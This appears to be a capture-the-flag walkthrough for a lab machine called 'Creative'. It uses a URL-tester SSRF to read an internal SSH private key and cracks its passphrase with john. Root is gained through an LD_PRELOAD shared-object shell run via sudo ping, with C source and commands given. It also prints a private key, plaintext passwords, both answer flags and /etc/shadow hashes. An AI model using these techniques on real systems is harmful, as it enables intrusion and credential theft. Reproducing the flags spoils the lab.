# Recon

### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/Creative/1-recon/nmap/nmap_init.md 10.10.164.66
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/Xr+IMJmnIyh82p1WwUsnFHgAELVccD6DdB1ksKH5HxD8iBoY83p3d/UfM8xlPzWGZkTAfZ+SR1b6MJEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baz/Vx5Elihfm3MoR0nrE2XFTY6HV2cwLojeWCww3njG+P1E4salm86MAswQWxOeHLk/a0wXJ343X5NaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMagHS//ASg3ikzouZS1nUmS7ehA9bGrhCbqMRSin1QJ/mnwYBylW6IsPyfuJfl9KFnbTITa56URmudd999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJYi013rcaMpy62pjPCO20nbNsnEG6QckMk/4RM=
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOIFbjvSW+v5RoDWDKFI//sn2LxlSxk2ovUPyUzpB1g/XQLlbF1oy3To2D8N8LAWwrLForz4IJ4JrZXR5KvRK8Y=
|   256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp4cBqmaBwYV
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

### WEB Part 1

add to /etc/hosts

```
10.10.164.66        creative.thm
```

![[creative thm.png]]

### DNS

```
gobuster vhost --append-domain -u http://creative.thm/ -t 50 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o /opt/THM/Creative/2-enum/dns/gob_vhost_sub2.md
```

```
Found: beta.creative.thm Status: 200 [Size: 591]
```

add to /etc/hosts

```
10.10.164.66        creative.thm beta.creative.thm
```

### WEB Part 2

since its a url tester, trying to test the machine's url to see if it will render it

testing http://localhost

![[localhost url.png]]

looking for other running services not accessible from the outside:

https://www.geeksforgeeks.org/50-common-ports-you-should-know/

starting up burpsuite, capturing the post request made to beta.creative.thm url form, then sending that post request to intruder

![[intruder req.png]]

specifying the port as the piece of the request that will be the variable to test all ports.

![[set port payload.png]]

ports 0, 80, 1337 all have long responses, so trying 1337 in the form:

we get a directory listing

![[1337 post.png]]

trying http://localhost:1337/home/, we see there is a user saad

![[web home.png]]

looking for sensitive files, we can see an ssh key

http://localhost:1337/home/saad/.ssh/id_rsa

```
-----BEGIN OPENSSH PRIVATE KEY----- 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 ksrXEYjaMdndnvxBZ0zi9T+ywag= 
-----END OPENSSH PRIVATE KEY-----

```

a little messed up but after some editing

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe
wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs
48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6
LzfUwwv9QZXMujHpExowWuwlEKBYiPeEK7mGvS0jJLsaEpQorZNvUhrUO4frSQA6/OTmXE
d/hMX2910cAiCa5NlgBn4nH8y5bjSrygFUSVJiMBVUY0H77mj6gmJUoz5jv96fV+rBaFoB
LGOy00gbX+2YTzBIJsKwOG97Q3HMnMKH+vCL09h/i3nQodWdqLP73U0PK2pu/nUFvGE8ju
nkkRVNqqO5m0eYfdkWHLKz13JzohUBBsLrtj6c9hc8CIqErf5B573RKdhu4gy4JkCMEW1D
xKhNWu+TI3VME1Q0ThJII/TMCR+Ih+/IDwgVTaW0LJR6Cn5nZzUHBLjkDV66vJRYN/3dJ5
bncTJ3dKFpec8AAAWQYx0osErJi/dcuK4vkpBkSG3N3iHsGeQh9KtrGHma9f5/l4HV1O2g
NpdxT+pG8ti5+pJmbA12WIILPWPmq8RlXJoPY2Hg6swPFtgB0KCLotz8XMjYTB0PMHpa4S
98bHQ0G0t3WtkYewKtGIe5J5kEw6YxGVg7/uXQVohACNoniByRMhX2HG6mkXV9p2zi9ym+
Zd7LYPSZ6FTKLouqJbpcADwX6YywSV8uXIGAnT6u5UJMU7EbQhextQYqPOzihsVDUL/uSw
quaPQYJ/8ZqBI5o3on+F2fVbNc7J/5t0gDd0tTzQDFZlMg3zJlnoVkxC+/NLuSrGrzC/52
1gAlLqjcVeGmzXESqWWI+4rF4dnVuwBcHDskZ8TbKEGueBjMX3FdafP0SAl7+gRQNp3OsW
VABMeWJmLDL+reNxAtsPTmDhXuDvoVfITx0V3Bu4UsRJpFl6rJpMgUyjeu3Dff9FjAqQRS
qvsCB1lPAmb50y6v2qveOHJav4DbP7KCYRNR5C1W5R74rDUbLusyWFApWxHVpTDdHY6Zba
+hmqT+kre2Qsg7fvBG7U8Fqe6jf1jVgSIMyUQ1UoowlmdBoP6/eI6Ce3p6lhqAfECb0mHT
Z5tvpxF3QjP6mOPTy1YabeCrsKWoTN821bZUAW0UO5OIGYoQZo5fo6u5g7kj1LmXNG15AU
ZAdKt56miOG5g4SsquDNVaJTQg7rsrVW3ghA4kE+BIRGmTuvKt5q4WZDB6gXXzJgEsZ5Kt
KbURhk1zzqxKprI+yYTrqmxki1EhS2V6qDlYoVscYnIZK9IDV/1c22nNEkSTWhKzHe+6A7
qWNMkOw9xaIdB8WV/yfCf2nOtAAdAYSl28r7c+WSoucqvVBEWhblTqz1oL+bYeDhqRWusP
e+gtkwODGaGQpUl793Eusk6vVYZni5xgOMDuERsREuT2ZsUP20AxVYw/mbUsOjeGpEoCGZ
UBwl2LeGGSDZgZJC+DLOj/Rg0uy9gaADI0Nrwz6ushxqFUg1RDV+WzFxIw9uDqFiL0gHwZ
FXiQLzmLQZ5X1JtWD2nqZwPnM66q9wOeMstYw8+8mJz5E/lTr80Nsde/eVYs3sY9STF+Ye
421hF21P2RLOYv4UM2aQ2hmfUb9MJ99Rj5UvpY83z4uUYu7Vmq2dMDcFsk7Zg8JdNDMg2O
GpgYRcLH44/iPrKRKdtdlVXILLKLjFau8TPzyhKfsa6/3H485Sc/YT94D+bRcx3uL+U003
l7H2rPQ2RDPQeRyLX12uRMcakQLY7zIEyFhH0fMw3rCTcdp/FbkOUEOfXBPkSNWHh7f411
15y/K7bkNDwSi5Ul9yt05uSSEsibJVSfKbvETEFmSQ3tdSVq0PA3ymiBzWixlNOE123KI0
Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs
fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+6
D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/6+sWRpg7H5jkNz
69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E
8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP
nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od
Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----

```

# Privilege Escalation

### User

the private key alone does not let us login to ssh, we need to try and get a password from this

```
ssh2john saad_rsa| tee saad_john.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt saad_john.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (saad_rsa)     
1g 0:00:00:28 DONE (2024-11-22 03:34) 0.03546g/s 34.04p/s 34.04c/s 34.04C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
sweetness
```


```
ssh -i saad_rsa saad@10.10.164.66 
sweetness
```

we get on the box 

```
Enter passphrase for key 'saad_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 22 Nov 2024 08:39:03 AM UTC

  System load:  0.0               Processes:             115
  Usage of /:   57.6% of 8.02GB   Users logged in:       0
  Memory usage: 54%               IPv4 address for eth0: 10.10.164.66
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

58 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$ whoami
saad
saad@m4lware:~$ uname -a
Linux m4lware 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
saad@m4lware:~$
```

/home/saad/user.txt

```
9a1ce90a7653d74ab98630b47b8b4a84
```
### Root

```
[-] Accounts that have recently used sudo:
/home/saad/.sudo_as_admin_successful
```

```
══════════╣ Searching passwords in history files
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:mysql -u root -p
/home/saad/.bash_history:mysql -u root
/home/saad/.bash_history:sudo su
/home/saad/.bash_history:ssh root@192.169.155.104
/home/saad/.bash_history:mysql -u user -p
/home/saad/.bash_history:mysql -u db_user -p
/home/saad/.bash_history:ls -ld /var/lib/mysql

```

in .bash_history
```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
```

try sudo with that password

```
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```


###  LD_Preload

seeing the LD_preload, we can dictate the value of this environmental variable when running a binary, in this case PING

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

```
cd /tmp
nano shell.c
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
```

now trying sudo with custom env variable and ping file

```
sudo LD_PRELOAD=/tmp/shell.so ping
```

```
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
# whoami
root
# uname -a
Linux m4lware 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User root may run the following commands on m4lware:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
992bfd94b90da48634aed182aae7b99f
```

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
saad:x:1000:1000:saad:/home/saad:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

/etc/shadow

```
root:$6$HDgtQ6h0zfUNqR02$pY6Ec8s8CS6diieLmxVs2aFfods/GxKRMB9VF/qeK.e9DiO/lkZoFc48LsZEsWSv3aJCBA.LYXktvy8TwWChD.:19486:0:99999:7:::
daemon:*:19235:0:99999:7:::
bin:*:19235:0:99999:7:::
sys:*:19235:0:99999:7:::
sync:*:19235:0:99999:7:::
games:*:19235:0:99999:7:::
man:*:19235:0:99999:7:::
lp:*:19235:0:99999:7:::
mail:*:19235:0:99999:7:::
news:*:19235:0:99999:7:::
uucp:*:19235:0:99999:7:::
proxy:*:19235:0:99999:7:::
www-data:*:19235:0:99999:7:::
backup:*:19235:0:99999:7:::
list:*:19235:0:99999:7:::
irc:*:19235:0:99999:7:::
gnats:*:19235:0:99999:7:::
nobody:*:19235:0:99999:7:::
systemd-network:*:19235:0:99999:7:::
systemd-resolve:*:19235:0:99999:7:::
systemd-timesync:*:19235:0:99999:7:::
messagebus:*:19235:0:99999:7:::
syslog:*:19235:0:99999:7:::
_apt:*:19235:0:99999:7:::
tss:*:19235:0:99999:7:::
uuidd:*:19235:0:99999:7:::
tcpdump:*:19235:0:99999:7:::
landscape:*:19235:0:99999:7:::
pollinate:*:19235:0:99999:7:::
usbmux:*:19329:0:99999:7:::
sshd:*:19329:0:99999:7:::
systemd-coredump:!!:19377::::::
saad:$6$ggS24MpcYt2PzO9q$ILTDqX6vMvDvf3K8VjI.2aHKT3v/He0kVGkBm/Pn57z3Oyo1lVedIU5.49rO2NGi.h/9efWoXVD9Xr0ApcnA.1:19378:0:99999:7:::
lxd:!:19377::::::
mysql:!:19377:0:99999:7:::
```